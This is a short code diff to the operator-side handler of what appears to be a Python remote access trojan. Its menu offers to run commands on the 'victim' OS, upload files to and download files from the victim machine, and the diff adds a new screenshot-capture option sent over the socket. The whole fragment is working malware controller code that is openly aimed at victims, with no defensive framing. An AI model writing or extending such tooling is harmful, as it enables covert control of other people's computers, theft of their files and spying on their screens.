@@ -2,11 +2,13 @@ import subprocess
 import os
 from fileupload import *
 from serverfiledownload import *
+from screenshot import *
 
 def show_options():
     print("[1] Run Command On Victiom OS ")
     print("[2] Upload File To Victim Machine ")
     print("[3] Download File From Victim Machine ")
+    print("[4] Capture Screenshot")
     print("")
     
 def serverhandler(my_socket):
@@ -27,6 +29,8 @@ def serverhandler(my_socket):
          elif ch == "3" or ch == "03" :
               #Download files from victim
               receive_file_folder(my_socket)
+         elif ch =="4" or ch == "04":
+              capture_screenshot(my_socket)
 
          elif ch == "exit" or ch == "quit":
              break
